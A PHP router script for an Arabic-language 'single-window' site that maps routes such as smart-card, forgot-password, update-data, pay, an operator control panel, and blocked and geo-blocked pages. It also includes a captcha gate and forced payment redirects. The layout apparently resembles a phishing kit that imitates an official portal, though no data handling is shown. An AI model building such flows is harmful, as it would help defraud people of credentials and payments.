<?php

declare(strict_types=1);

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';
$projectRoot = __DIR__;
$rootReal = realpath($projectRoot) ?: $projectRoot;

// PHP's built-in server sets SCRIPT_NAME to the requested file (e.g. /assets/css/app.css),
// not router.php. Serve public files from the original URI before any base-path rewrite.
$requestedFile = realpath($projectRoot . $path);
if (
    str_starts_with($path, '/assets/')
    && $requestedFile
    && is_file($requestedFile)
    && str_starts_with($requestedFile, $rootReal . DIRECTORY_SEPARATOR . 'assets' . DIRECTORY_SEPARATOR)
) {
    return false;
}

$scriptName = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '/index.php');
$scriptBasename = basename($scriptName);
$scriptDirectory = rtrim(str_replace('\\', '/', dirname($scriptName)), '/.');
$isFrontController = in_array($scriptBasename, ['index.php', 'router.php'], true);
$baseUrl = ($isFrontController && $scriptDirectory !== '' && $scriptDirectory !== '/')
    ? $scriptDirectory
    : '';
if ($baseUrl !== '' && ($path === $baseUrl || str_starts_with($path, $baseUrl . '/'))) {
    $path = substr($path, strlen($baseUrl)) ?: '/';
}
if ($path === '' || $path[0] !== '/') {
    $path = '/' . ltrim($path, '/');
}
if ($path !== '/') {
    $path = rtrim($path, '/') ?: '/';
}
$requestedFile = realpath($projectRoot . $path);

if (
    str_starts_with($path, '/app/')
    || str_starts_with($path, '/partials/')
    || str_starts_with($path, '/outputs/')
    || str_starts_with($path, '/storage/')
    || str_starts_with(basename($path), '.')
) {
    http_response_code(404);
    require $projectRoot . '/404.php';
    return true;
}

if (str_starts_with($path, '/api/')) {
    $apiFile = $projectRoot . $path;
    if (is_file($apiFile) && str_ends_with($apiFile, '.php')) {
        require $apiFile;
        return true;
    }
    http_response_code(404);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => false, 'error' => 'not_found'], JSON_UNESCAPED_UNICODE);
    return true;
}

$routes = [
    '/' => 'index.php',
    '/smart-card' => 'smart-card.php',
    '/forgot-password' => 'forgot-password.php',
    '/update-data' => 'update-data.php',
    '/portal' => 'portal.php',
    '/service' => 'service.php',
    '/register' => 'register.php',
    '/pay' => 'pay.php',
    '/control' => 'control.php',
    '/control-login' => 'control-login.php',
    '/control-logout' => 'control-logout.php',
    '/blocked' => 'blocked.php',
    '/geo-blocked' => 'geo-blocked.php',
    '/access-help' => 'access-help.php',
    '/user-type' => 'user-type.php',
    '/request' => 'request.php',
    '/details' => 'details.php',
    '/review' => 'review.php',
    '/success' => 'success.php',
];

// Bot/automation guard: prevent skipping the main screen.
// If the user hasn't solved the home image-captcha yet, block access to flow pages.
$captchaBypassPaths = [
    '/',
    '/access-help',
    '/blocked',
    '/geo-blocked',
    '/smart-card',
    '/register',
    '/forgot-password',
    '/control',
    '/control-login',
    '/control-logout',
    '/portal',
    '/service',
];
$isFlowRoute = isset($routes[$path]);
$isUpdateDataRoute = $path === '/update-data';
try {
    if ($isFlowRoute && !in_array($path, $captchaBypassPaths, true)) {
        require_once __DIR__ . '/app/bootstrap.php';
        require_once __DIR__ . '/app/sessions.php';
        require_once __DIR__ . '/app/image-captcha.php';
        $allowForcedPay = $path === '/pay' && sw_session_has_pending_pay_redirect();
        if (!sw_image_captcha_home_used() && !$allowForcedPay) {
            $redirectTo = $baseUrl !== '' ? $baseUrl . '/' : '/';
            header('Location: ' . $redirectTo);
            exit;
        }
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_write_close();
        }
    }

    if (isset($routes[$path])) {
        require $projectRoot . '/' . $routes[$path];
        return true;
    }

    if (preg_match('#^/service/([A-Za-z0-9-]+)/?$#', $path) === 1) {
        require $projectRoot . '/service.php';
        return true;
    }

    http_response_code(404);
    require $projectRoot . '/404.php';
    return true;
} catch (Throwable $e) {
    if (!$isUpdateDataRoute) {
        throw $e;
    }

    @error_log('[single-window] router /update-data failed: ' . $e->getMessage());
    http_response_code(200);
    header('Content-Type: text/html; charset=utf-8');

    $cssUrl = $baseUrl !== '' ? $baseUrl . '/assets/css/app.css' : '/assets/css/app.css';
    $registerUrl = $baseUrl !== '' ? $baseUrl . '/register' : '/register';
    $debug = !empty($_GET['debug']);

    $cssEsc = htmlspecialchars($cssUrl, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $regEsc = htmlspecialchars($registerUrl, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $msgEsc = htmlspecialchars($e->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

    echo '<!doctype html>';
    echo '<html lang="ar" dir="rtl">';
    echo '<head>';
    echo '<meta charset="utf-8">';
    echo '<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">';
    echo '<title>تحديث البيانات</title>';
    echo '<link rel="stylesheet" href="' . $cssEsc . '">';
    echo '</head>';
    echo '<body class="nas-login-screen forgot-password-screen update-data-screen" data-page="update-data">';
    echo '<section class="nas-shell reset-shell">';
    echo '<article class="nas-card reset-card">';
    echo '<h1 class="reset-card__title">تحديث البيانات</h1>';
    echo '<p class="reset-card__lead">حصل خطأ بسيط أثناء تجهيز الصفحة. الرجاء إعادة المحاولة.</p>';
    echo '<a class="reset-continue" href="' . $regEsc . '">استمر</a>';
    if ($debug) {
        echo '<pre style="white-space:pre-wrap;direction:ltr;margin-top:12px;">' . $msgEsc . '</pre>';
    }
    echo '</article>';
    echo '</section>';
    echo '</body>';
    echo '</html>';
    return true;
}
